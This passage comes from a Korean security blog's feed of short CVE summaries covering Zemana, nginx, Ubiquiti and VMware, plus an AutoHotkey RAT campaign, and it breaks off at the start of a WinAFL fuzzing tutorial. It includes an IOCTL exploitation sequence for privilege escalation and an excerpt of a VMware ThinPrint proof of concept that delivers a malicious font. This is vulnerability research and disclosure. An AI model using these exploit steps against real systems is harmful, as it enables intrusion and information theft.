ê¶Œí•œìœ¼ë¡œ í”„ë¡œì„¸ìŠ¤ë¥¼ ì‹¤í–‰ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><ol><li>IOCTL <code>0x80002010</code>ìœ¼ë¡œ <code>\.\ZemanaAntiMalware</code> ì— ëŒ€í•œ í•¸ë“¤ì„ ê°€ì ¸ì˜´</li><li>IOCTL <code>0x80002040</code>ìœ¼ë¡œ NonPagedPoolì— ì»¤ë„ ë©”ëª¨ë¦¬ í• ë‹¹</li><li><code>SystemBigPoolInformation</code>ë¡œ í• ë‹¹ëœ ì»¤ë„ ë©”ëª¨ë¦¬ ê²€ìƒ‰</li><li>IOCTL <code>0x80002044</code>ë¡œ miniport ë“œë¼ì´ë²„ êµ¬ì„±</li><li>IOCTL <code>0x80002014</code> ë˜ëŠ” <code>0x80002018</code>ë¡œ í•´ì»¤ê°€ ì •ì˜í•œ miniport ë“œë¼ì´ë²„ ì‹¤í–‰</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>lpe</tag>
      
      <tag>L0ch</tag>
      
      <tag>local privilege escalation</tag>
      
      <tag>antimalware</tag>
      
      <tag>driver exploit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-23017: nginx DNS Resolver Off-by-One Heap Write Vulnerability</title>
    <link href="/2021/05/27/idioth/2021-05-27/"/>
    <url>/2021/05/27/idioth/2021-05-27/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://x41-dsec.de/lab/advisories/x41-2021-002-nginx-resolver-copy/">Advisory X41-2021-002: nginx DNS Resolver Off-by-One Heap Write Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>nginx 0.6.18 - 1.20.0</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ì˜¤í”ˆ ì†ŒìŠ¤ ì›¹ ì„œë²„ í”„ë¡œê·¸ë¨ nginxì˜ <code>ngx_resolver_copy()</code>ì—ì„œ DNS responseë¥¼ ì²˜ë¦¬í•˜ëŠ” ë™ì•ˆ ë°œìƒí•˜ëŠ” off-by-oneìœ¼ë¡œ ì¸í•´ heap ì˜ì—­ì˜ 1-byte ë©”ëª¨ë¦¬ë¥¼ ë®ì–´ì“¸ ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p><code>ngx_resolver_copy()</code>ëŠ” DNS responseì— í¬í•¨ëœ DNS ë„ë©”ì¸ ì´ë¦„ì˜ ìœ íš¨ì„±ì„ ê²€ì‚¬í•˜ê³  ì••ì¶•ì„ í•´ì œí•˜ëŠ” ì‘ì—…ì„ ë‹¤ìŒ ë‘ ë‹¨ê³„ë¡œ ì²˜ë¦¬í•©ë‹ˆë‹¤.</p><ol><li>ì••ì¶•ë˜ì§€ ì•Šì€ ë„ë©”ì¸ ì´ë¦„ í¬ê¸°ì¸ <code>len</code>ì„ ê³„ì‚°í•˜ê³  128 í¬ì¸í„°ê°€ ë„˜ì–´ê°€ê±°ë‚˜ ë²„í¼ì˜ ë²”ìœ„ë¥¼ ë²—ì–´ë‚˜ëŠ” ë¶€ë¶„ì„ ë²„ë¦½ë‹ˆë‹¤.</li><li>Output bufferë¥¼ í• ë‹¹í•˜ê³  ì••ì¶•ë˜ì§€ ì•Šì€ ì´ë¦„ì„ ë³µì‚¬í•©ë‹ˆë‹¤.</li></ol><p>ì´ ê³¼ì •ì—ì„œ 1ë²ˆì˜ <code>len</code>ê³¼ 2ë²ˆì— ì••ì¶•ë˜ì§€ ì•Šì€ ì´ë¦„ì˜ í¬ê¸°ê°€ ë‹¬ë¼ <code>name-&gt;data</code>ì—ì„œ 1 ë°”ì´íŠ¸ë¥¼ ë²—ì–´ë‚˜ ë®ì–´ì“¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>nginx DNS responseë¥¼ ë°›ê¸° ìœ„í•´ DNS requestë¥¼ ë³´ë‚¸ í›„, <code>QNAME</code>, <code>NAME</code>, <code>RDATA</code> ì¤‘ í•˜ë‚˜ì˜ ê°’ì„ í†µí•´ í•´ë‹¹ ì·¨ì•½ì ì„ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ <code>CNAME</code>ì„ ì‚¬ìš©í•  ê²½ìš° ì¬ê·€ì ìœ¼ë¡œ ì²˜ë¦¬ë˜ì–´ <code>ngx_resolve_name_locked()</code>ê°€ í˜¸ì¶œë  ë•Œ ì¶”ê°€ì ì¸ OOB writeê°€ ê°€ëŠ¥í•˜ê³  <code>ngx_resolver_dup()</code>ê³¼ <code>ngx_crc32_short()</code>ë¥¼ í†µí•´ OOB readê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><p>í•´ë‹¹ ì·¨ì•½ì ì˜ POC ì½”ë“œëŠ” <a href="https://github.com/x41sec/advisories/blob/master/X41-2021-002/poc.py">github</a>ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>idioth</tag>
      
      <tag>oob read</tag>
      
      <tag>dns resolver</tag>
      
      <tag>oob write</tag>
      
      <tag>nginx</tag>
      
      <tag>dns</tag>
      
      <tag>off-by-one</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-22909: Ubiquiti ë¼ìš°í„° íŒì›¨ì–´ ì—…ë°ì´íŠ¸ ì·¨ì•½ì </title>
    <link href="/2021/05/26/fabu1ous/2021-05-26/"/>
    <url>/2021/05/26/fabu1ous/2021-05-26/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/5/24/cve-2021-22909-digging-into-a-ubiquiti-firmware-update-bug">CVE-2021-22909- DIGGING INTO A UBIQUITI FIRMWARE UPDATE BUG</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Ubiquiti EdgeRouter</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>CVE-2021-22909ì— ëŒ€í•œ íŒ¨ì¹˜ê°€ ì´ë£¨ì–´ì¡ŒìŠµë‹ˆë‹¤. Ubiquiti EdgeRouterì˜ íŒì›¨ì–´ ì—…ë°ì´íŠ¸ ì‘ì—…ì— MiTM(man-in-the-middle) ê³µê²©ì— ëŒ€í•œ ë°©ì§€ ë¶€ì¬ë¡œ ì¸í•´ ë¼ìš°í„° ê¸°ê¸°ì— ì•…ì„± íŒì›¨ì–´ ì´ë¯¸ì§€ë¥¼ ì„¤ì¹˜í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤. í•´ì»¤ëŠ” ì´ë¥¼ ì•…ìš©í•´ ë¼ìš°í„° ê¸°ê¸°ì— ì•…ì„± íŒì›¨ì–´ë¥¼ ì„¤ì¹˜í•  ìˆ˜ ìˆê³  root ê¶Œí•œìœ¼ë¡œ ì„ì˜ ì½”ë“œ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><p>Ubiquiti EdgeRouterëŠ” templated operational commandë¥¼ ì§€ì›í•©ë‹ˆë‹¤. Templated operational commandë€ ë¼ìš°í„°ì˜ ì„¤ì •ì„ ë¹ ë¥´ê³  ê°„í¸í•˜ê²Œ ìˆ˜ì •í•  ìˆ˜ ìˆë„ë¡ ì§œì¸ ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰ ëª…ë ¹ì–´ì…ë‹ˆë‹¤. ìœ ì €ê°€ CLIì— <code>add system image</code>ë¥¼ ì…ë ¥í•˜ë©´ <code>ubnt-fw-latest</code> ìŠ¤í¬ë¦½íŠ¸ê°€ ì‹¤í–‰ë˜ì–´ íŒì›¨ì–´ë¥¼ ì—…ë°ì´íŠ¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><code>unbt-fw-latest</code> ìŠ¤í¬ë¦½íŠ¸ëŠ” <code>upgrade_firmware()</code>í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•´ Ubiquiti update serverë¡œë¶€í„° ë‹¤ìš´ ë¡œë“œ URLì„ í¬í•¨í•œ ìµœì‹  íŒì›¨ì–´ ì •ë³´ë¥¼ ë°›ì•„ì˜µë‹ˆë‹¤. ê·¸ í›„ ë°›ì•„ì˜¨ ì •ë³´ë¥¼ íŒŒì‹± í•´ í˜„ì¬ íŒì›¨ì–´ ë²„ì „ê³¼ ë¹„êµí•˜ê³  ì—…ë°ì´íŠ¸ê°€ ê°€ëŠ¥í•˜ë©´ <code>ubnt-upgrade</code> ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•´ ì œê³µë°›ì€ urlë¡œë¶€í„° íŒì›¨ì–´ë¥¼ ì„¤ì¹˜í•©ë‹ˆë‹¤.</p><p><code>ubnt-upgrade</code> ìŠ¤í¬ë¦½íŠ¸ê°€ í˜¸ì¶œí•˜ëŠ” <code>get_tar_by_url()</code> í•¨ìˆ˜ëŠ” curl ì»¤ë§¨ë“œë¥¼ ì‚¬ìš©í•´ íŒì›¨ì–´ë¥¼ ì„¤ì¹˜í•˜ëŠ”ë° -k ì˜µì…˜(TLS ì¸ì¦ì„œ ê²€ì¦ ë¹„í™œì„±í™”)ì´ ì„¤ì •ë˜ì–´ìˆì–´ ì·¨ì•½ì ì´ ë°œìƒí•©ë‹ˆë‹¤. í•´ì»¤ëŠ” MITMìœ¼ë¡œ ìì‹ ì˜ ë„ë©”ì¸ì„ ì†ì—¬ ë¼ìš°í„°ì— ì•…ì„± íŒì›¨ì–´ë¥¼ ì„¤ì¹˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs powershell">get_tar_by_url () &#123;     mkdir <span class="hljs-variable">$TMP_DIR</span>     <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$NOPROMPT</span>&quot;</span> -<span class="hljs-type">eq</span> <span class="hljs-number">0</span> ]; then         <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Trying to get upgrade file from <span class="hljs-variable">$TAR</span>&quot;</span>     fi       <span class="hljs-keyword">if</span> [ -<span class="hljs-type">n</span> <span class="hljs-string">&quot;<span class="hljs-variable">$USERNAME</span>&quot;</span> ]; then         auth=<span class="hljs-string">&quot;-u <span class="hljs-variable">$USERNAME:</span><span class="hljs-variable">$PASSWORD</span>&quot;</span>     <span class="hljs-keyword">else</span>         auth=<span class="hljs-string">&quot;&quot;</span>     fi       filename=<span class="hljs-string">&quot;<span class="hljs-variable">$</span>&#123;TMP_DIR&#125;/<span class="hljs-variable">$</span>&#123;TAR##*/&#125;&quot;</span>     <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$NOPROMPT</span>&quot;</span> -<span class="hljs-type">eq</span> <span class="hljs-number">0</span> ]; then         <span class="hljs-built_in">curl</span> <span class="hljs-literal">-k</span> <span class="hljs-variable">$auth</span> <span class="hljs-operator">-f</span> <span class="hljs-literal">-L</span> <span class="hljs-literal">-o</span> <span class="hljs-variable">$filename</span> <span class="hljs-variable">$TAR</span>      <span class="hljs-comment"># &lt;-----  </span>    <span class="hljs-keyword">else</span>         <span class="hljs-built_in">curl</span> <span class="hljs-literal">-k</span> <span class="hljs-variable">$auth</span> <span class="hljs-operator">-f</span> <span class="hljs-literal">-s</span> <span class="hljs-literal">-L</span> <span class="hljs-literal">-o</span> <span class="hljs-variable">$filename</span> <span class="hljs-variable">$TAR</span>   <span class="hljs-comment"># &lt;----- </span>    fi     <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$</span>? -<span class="hljs-type">ne</span> <span class="hljs-number">0</span> ]; then         <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Unable to get upgrade file from <span class="hljs-variable">$TAR</span>&quot;</span>         <span class="hljs-built_in">rm</span> <span class="hljs-operator">-f</span> <span class="hljs-variable">$filename</span>         <span class="hljs-built_in">rm</span> <span class="hljs-operator">-f</span> <span class="hljs-variable">$DOWNLOADING</span>         <span class="hljs-keyword">exit</span> <span class="hljs-number">1</span>     fi       <span class="hljs-keyword">if</span> [ ! -<span class="hljs-type">e</span> <span class="hljs-variable">$filename</span> ]; then         <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Download of <span class="hljs-variable">$TAR</span> failed&quot;</span>         <span class="hljs-built_in">rm</span> <span class="hljs-operator">-f</span> <span class="hljs-variable">$DOWNLOADING</span>         <span class="hljs-keyword">exit</span> <span class="hljs-number">1</span>     fi       <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$NOPROMPT</span>&quot;</span> -<span class="hljs-type">eq</span> <span class="hljs-number">0</span> ]; then         <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Download succeeded&quot;</span>     fi       TAR=<span class="hljs-variable">$filename</span> &#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>router</tag>
      
      <tag>misconfiguration</tag>
      
      <tag>firmware patch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-21987: VMWare Workstation ê°€ìƒ í”„ë¦°í„°ì˜ OOB read ì·¨ì•½ì </title>
    <link href="/2021/05/25/l0ch/2021-05-25/"/>
    <url>/2021/05/25/l0ch/2021-05-25/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/houjingyi233/my-bugs/tree/main/CVE-2021-21987-vmware-out-of-bounds%20read%20vulnerability%20via%20Cortado%20ThinPrint">CVE-2021-21987-vmware-out-of-bounds read vulnerability via Cortado ThinPrint</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>VMware Workstation 16.1.2 ì´ì „</li><li>Horizon Client 5.5.2 ì´ì „</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>VMWare Workstation ë° Windowsìš© Horizon Clientì— ì„¤ì¹˜ëœ Windows 10ì˜ ê°€ìƒ í”„ë¦°í„° êµ¬ì„±ìš”ì†Œì—ì„œ ë°œê²¬ëœ ë²”ìœ„ë¥¼ ë²—ì–´ë‚œ ì½ê¸°(Out-of-Bound Read) ì·¨ì•½ì ì˜ PoCê°€ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>VMWareì˜ ê°€ìƒ í”„ë¦°í„°ì¸ ThinPrint êµ¬ì„± ìš”ì†ŒëŠ” ê²ŒìŠ¤íŠ¸ Windowsì—ì„œ ë¬¸ì„œ ë° ì´ë¯¸ì§€ë¥¼ íŒŒì‹±í•´ í˜¸ìŠ¤íŠ¸ OSì— ì—°ê²°ëœ í”„ë¦°í„°ë¡œ ì¶œë ¥í•  ìˆ˜ ìˆëŠ” ê¸°ëŠ¥ì„ ì§€ì›í•©ë‹ˆë‹¤. ì·¨ì•½ì ì€ <code>rundll32.exe</code>ì—ì„œ ë¡œë“œë˜ëŠ” <code>TPView.dll</code>ì´ í°íŠ¸ í™•ì¥ì <code>TrueType Font(TTF)</code>ë¥¼ íŒŒì‹±í•˜ëŠ” ì½”ë“œì— ì¡´ì¬í•˜ë©° TTF íŒŒì¼ì˜ ê²€ì¦ì´ ì¶©ë¶„íˆ ì´ë£¨ì–´ì§€ì§€ ì•Šì•„ í•´ì»¤ì˜ ì•…ì„± TTF íŒŒì¼ì„ íŒŒì‹±í•˜ëŠ” ê³¼ì •ì—ì„œ ë©”ëª¨ë¦¬ë¥¼ ì½ì–´ ì •ë³´ ìœ ì¶œë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì•„ë˜ëŠ” COM1 í¬íŠ¸ì˜ ê°€ìƒ í”„ë¦°í„°ë¥¼ í™œì„±í™”í•˜ê³  ì•…ì„± TTF íŒŒì¼ì„ ì „ë‹¬í•˜ëŠ” PoCì˜ ì¼ë¶€ì…ë‹ˆë‹¤.</p><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TPVM</span>:</span>SERIAL_PORT=<span class="hljs-string">b&#x27;\\\\\\\\.\\\\COM1&#x27;</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span>        self.hPort=windll.kernel32.CreateFileA(self.SERIAL_PORT,                                               <span class="hljs-number">0xc0000000</span>, <span class="hljs-comment"># GENERIC_READ | GENERIC_WRITE</span>                                               <span class="hljs-number">3</span>,          <span class="hljs-comment"># FILE_SHARE_READ | FILE_SHARE_WRITE</span>                                               <span class="hljs-literal">None</span>,                                               <span class="hljs-number">3</span>,          <span class="hljs-comment"># OPEN_EXISTING</span>                                               <span class="hljs-number">0</span>,                                               <span class="hljs-literal">None</span>)        <span class="hljs-keyword">if</span> (self.hPort &amp; <span class="hljs-number">0xffffffff</span>) == <span class="hljs-number">0xffffffff</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;the serial port could not be opened (0x%08x)&#x27;</span>%(GetLastError()))        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> windll.kernel32.SetupComm(self.hPort, <span class="hljs-number">0x20000</span>, <span class="hljs-number">0x84d0</span>):            <span class="hljs-keyword">raise</span> WinError()...t = TPVM()...f = open(<span class="hljs-string">&quot;poc.ttf&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>)font_data = f.read()f.close()emri_engine_font = struct.pack(<span class="hljs-string">&#x27;&lt;IIIII&#x27;</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">8</span> + FONT_COUNT * <span class="hljs-number">4</span> + len(font_data) + <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, FONT_COUNT, len(font_data))emri_engine_font += binascii.a2b_hex(<span class="hljs-string">&#x27;00000000&#x27;</span>)emri_engine_font += font_data<span class="hljs-comment"># Put it all together.</span>data_plaintext = devmode + emfspool_hdr + emf + emri_metafile_ext + emri_engine_fontdata_compressed = zlib.compress(data_plaintext, <span class="hljs-number">9</span>)print_command = struct.pack(<span class="hljs-string">&#x27;&lt;H&#x27;</span>, <span class="hljs-number">0</span>) + struct.pack(<span class="hljs-string">&#x27;&lt;II&#x27;</span>, len(data_compressed), len(data_plaintext)) + data_compressed<span class="hljs-comment"># Send the printing command.</span>t.do_data(print_command)t.do_command(<span class="hljs-number">0x8002</span>)t.close()</code></pre><p>í•´ë‹¹ ì·¨ì•½ì ì€ ì§€ë‚œ 2016ë…„ Google Project Zeroê°€ ë°œê²¬í•œ <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=849">CVE-2016-7083</a> ê³¼ ìœ ì‚¬í•œ ê²ƒìœ¼ë¡œ ì•Œë ¤ì¡ŒìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>oob read</tag>
      
      <tag>out-of-bounds</tag>
      
      <tag>vmware</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] AutoHotkey ê¸°ë°˜ ì•…ì„±ì½”ë“œ ê³µê²© ì£¼ì˜</title>
    <link href="/2021/05/24/idioth/2021-05-24/"/>
    <url>/2021/05/24/idioth/2021-05-24/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://thehackernews.com/2021/05/experts-warn-about-ongoing-autohotkey.html">Experts Warn About Ongoing AutoHotkey-Based Malware Attacks</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ì—¬ëŸ¬ ì‚¬ì´ë²„ ë³´ì•ˆ ì—°êµ¬ì›ë“¤ì´ Microsoft Windowsë¥¼ íƒ€ê¹ƒìœ¼ë¡œ í•œ Revenge RAT, LimeRAT, AsyncRAT, Houdini, Vjw0rm ë“±ì˜ RATì— AutoHotkey(AHK) ìŠ¤í¬ë¦½íŠ¸ ì–¸ì–´ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì´ ë°œê²¬í•˜ì˜€ìŠµë‹ˆë‹¤.</p><p><a href="https://www.autohotkey.com/">AutoHotkey(AHK)</a>ëŠ” Windows ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ë§¤í¬ë¡œ, ì†Œí”„íŠ¸ì›¨ì–´ ìë™í™” ë“±ì— ì‚¬ìš©ë˜ëŠ” ì˜¤í”ˆ ì†ŒìŠ¤ ì»¤ìŠ¤í…€ ìŠ¤í¬ë¦½íŠ¸ ì–¸ì–´ì…ë‹ˆë‹¤.</p><p>AHK ì•…ì„± íŒŒì¼ì€ <code>FileInstall</code> ëª…ë ¹ì–´ë¥¼ í†µí•´ AHK ì¸í„°í”„ë¦¬í„°, AHK ìŠ¤í¬ë¦½íŠ¸, íŒŒì¼ë“¤ì„ í¬í•¨í•˜ì—¬ ë…ë¦½ì ì¸ ì‹¤í–‰ íŒŒì¼ë¡œ ë§Œë“¤ì–´ì§‘ë‹ˆë‹¤. ì•…ì„±ì½”ë“œ ì œì‘ìë“¤ì€ ì •ìƒì ì¸ í”„ë¡œê·¸ë¨ìœ¼ë¡œ ìœ„ì¥í•˜ê¸° ìœ„í•´ ì•…ì„± ìŠ¤í¬ë¦½íŠ¸ì™€ ì •ìƒì ì¸ íŒŒì¼ë“¤ì„ ë¬¶ì–´ì„œ ì•…ì„± ì‹¤í–‰ íŒŒì¼ì„ ìƒì„±í•˜ì˜€ìŠµë‹ˆë‹¤. RAT ì•…ì„±ì½”ë“œ ê°ì—¼ì€ AHK ì‹¤í–‰ íŒŒì¼ì—ì„œ ì‹œì‘ë˜ë©° ê³µê²© ì²´ì¸ê³¼ ìƒê´€ì—†ì´ VBScriptë¥¼ ë“œë¡­í•˜ê³  ì‹¤í–‰í•˜ì—¬ RAT íŒŒì¼ì„ ë¡œë“œí•©ë‹ˆë‹¤.</p><p>3ì›” 31ì¼ì— ë°œê²¬ëœ ì•…ì„±ì½”ë“œëŠ” AHK ì‹¤í–‰ íŒŒì¼ì„ í†µí•´ RAT íŒŒì¼ì„ ë“œë¡­í•˜ê³  ë°°ì¹˜ ìŠ¤í¬ë¦½íŠ¸ë¥¼ í†µí•´ Microsoft Defenderë¥¼ ë¹„í™œì„±í™”í•˜ì˜€ìŠµë‹ˆë‹¤. ë˜ ë‹¤ë¥¸ ì•…ì„±ì½”ë“œëŠ” í”¼í•´ìì˜ <a href="https://en.wikipedia.org/wiki/Hosts_(file)">hosts íŒŒì¼</a>ì„ ë³€ì¡°í•˜ì—¬ ìœ ëª…í•œ ì•…ì„±ì½”ë“œë“¤ì´ ì ‘ê·¼í•˜ëŠ” ê²ƒì„ ë§‰ì•˜ìŠµë‹ˆë‹¤.</p><p>ë‹¤ë¥¸ ì•…ì„±ì½”ë“œë“¤ ë˜í•œ AHK ì‹¤í–‰ íŒŒì¼ì—ì„œ VBScriptë‚˜ Powershellì„ í†µí•´ RAT íŒŒì¼ì„ ë“œë¡­í•˜ê³ , Microsoft Defenderë¥¼ ë¹„í™œì„±í™”í•˜ëŠ” ë“±ì˜ ê³µí†µì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>malware</tag>
      
      <tag>autohotkey</tag>
      
      <tag>rat</tag>
      
      <tag>trojan</tag>
      
      <tag>vbscript</tag>
      
      <tag>powershell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] WinAFLë¡œ ë§ˆêµ¬ í¼ì§•í•˜ê¸° Part1</title>
    <link href="/2021/05/23/fabu1ous/winafl-1/"/>
    <url>/2021/05/23/fabu1ous/winafl-1/</url>
    
    <content type="html"><![CDATA[<h1 id="ë¨¸ë¦¿ë§"><a href="#ë¨¸ë¦¿ë§" class="headerlink" title="ë¨¸ë¦¿ë§"></a>ë¨¸ë¦¿ë§</h1><p>ì•ˆë…•í•˜ì„¸ìš” Fabu1ousì…ë‹ˆë‹¤. ìµœê·¼ ë²„ê·¸ ë°”ìš´í‹° í”„ë¡œì íŠ¸ë¥¼ í•˜ë©´ì„œ WinAFL ì‚¬ìš©ë²•ì„ ìµíˆê³  ìˆìŠµë‹ˆë‹¤. WinAFLì€ í”„ë¡œì„¸ìŠ¤ë¥¼ ì¢…ë£Œí•˜ì§€ ì•Šê³  Harness í”„ë¡œê·¸ë¨ì„ í†µí•´ íŠ¹ì • í•¨ìˆ˜ë§Œì„ ë°˜ë³µ ì‹¤í–‰í•˜ëŠ” ë°©ì‹ì„ ì‚¬ìš©í•´ ë¹ ë¥¸ í¼ì§•ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤. HarnessëŠ” ìˆ˜ë ˆë¥¼ ëŒ ìˆ˜ ìˆë„ë¡ ë§ì—ê²Œ ì”Œìš°ëŠ” ì œê°ˆ, ë§ì•ˆì¥, ê³ ì‚ ë“±ì´ í•©ì³ì§„ ê¸°êµ¬ì…ë‹ˆë‹¤. <del>í•œê¸€ë¡œëŠ” ë§ˆêµ¬ë¼ê³  ë¶€ë¥´ëŠ”ë° ë§ˆêµ¬ë¡œ ë§ˆêµ¬ í¼ì§• í•˜ë©´ í¬ë˜ì‹œê°€ ë§ˆêµ¬ë§ˆêµ¬ í„°ì§€ë‚˜?</del></p><p><img src="/2021/05/23/fabu1ous/winafl-1/1.png"></p><p>WinAFLì— ëŒ€í•œ ê°„ë‹¨í•œ ì†Œê°œì™€ ì§ì ‘ Harnessë¥¼ ì‘ì„±í•´ë³¸ ê³¼ì •ì„ ì •ë¦¬í•´ë´¤ìŠµë‹ˆë‹¤. ì´ë²ˆ Part 1ì—ì„  ì²˜ìŒ Harnessë¥¼ ì‘ì„±í•˜ê³  í¼ì§• í•´ë³¸ ê³¼ì •ì„, ë‹¤ìŒ ê¸€ì¸ Part 2ì—ì„  Harnessì˜ ì†ë„ ê°œì„ ì„ ìœ„í•´ ì‚½ì§ˆí•œ ê³¼ì •ì„ ì¨ë³¼ê¹Œ í•©ë‹ˆë‹¤. </p><h1 id="WinAFL"><a href="#WinAFL" class="headerlink" title="WinAFL"></a>WinAFL</h1><p>AFL(American Fuzzy Lop)ì€ Coverage-guided í¼ì§• íˆ´ì…ë‹ˆë‹¤. Execution path ë¶„ì„ì„ í†µí•œ ë„“ì€ ì½”ë“œ ì»¤ë²„ë¦¬ì§€ì™€ ë£¨í”„ ì‹¤í–‰ì„ í†µí•œ ë¹ ë¥¸ ì†ë„ê°€ íŠ¹ì§•ì…ë‹ˆë‹¤. ê·¸ë¦¬ê³  ì´ëŸ¬í•œ AFLì„ Windowsì—ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆê²Œ ë³€í˜•í•œ ê²ƒì´ ë°”ë¡œ WinAFLì…ë‹ˆë‹¤.</p><p>ì´ë²ˆ ì‹œë¦¬ì¦ˆì—ì„  WinAFLì˜ ë¹ ë¥¸ í¼ì§• ì†ë„ì— ì§‘ì¤‘í•´ë³¼ê¹Œ í•©ë‹ˆë‹¤. WinAFLì˜ ë°˜ë³µ ì‹¤í–‰(iteration)ì€ ë‹¤ë¥¸ í¼ì € ë“¤ê³¼ ë‹¤ë¥¸ ë°©ì‹ì„ ì‚¬ìš©í•˜ëŠ”ë° ì´ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li>íƒ€ê²Ÿ í•¨ìˆ˜ì— ë„ë‹¬í•  ë•Œê¹Œì§€ í”„ë¡œê·¸ë¨ ì‹¤í–‰</li><li>ì½”ë“œ ì»¤ë²„ë¦¬ì§€ ê¸°ë¡</li><li>íƒ€ê²Ÿ í•¨ìˆ˜ê°€ ë¦¬í„´í•  ë•Œê¹Œì§€ ì‹¤í–‰</li><li>ì½”ë“œ ì»¤ë²„ë¦¬ì§€ íšŒìˆ˜, input íŒŒì¼ ìˆ˜ì •, EIPë¥¼ ì¡°ì‘í•´ 2ë²ˆ ê³¼ì •ìœ¼ë¡œ ë³µê·€</li><li>ì¼ì • íšŸìˆ˜ë§Œí¼ ë°˜ë³µ ì‹¤í–‰ í›„ íƒ€ê²Ÿ í”„ë¡œì„¸ìŠ¤ë¥¼ ì¢…ë£Œ, 1ë²ˆë¶€í„° ë‹¤ì‹œ ì‹œì‘</li></ol><p>ì—¬ê¸°ì„œ ì¤‘ìš”í•œ ê²Œ ë°”ë¡œ 4ë²ˆ ê³¼ì •, ì¦‰ í”„ë¡œì„¸ìŠ¤ë¥¼ ì¢…ë£Œí•˜ì§€ ì•Šê³  íƒ€ê²Ÿ í•¨ìˆ˜ë§Œ ë°˜ë³µ ì‹¤í–‰ì„ í•œë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤. ë§¤ë²ˆ í”„ë¡œì„¸ìŠ¤ë¥¼ ì¢…ë£Œí•˜ê³  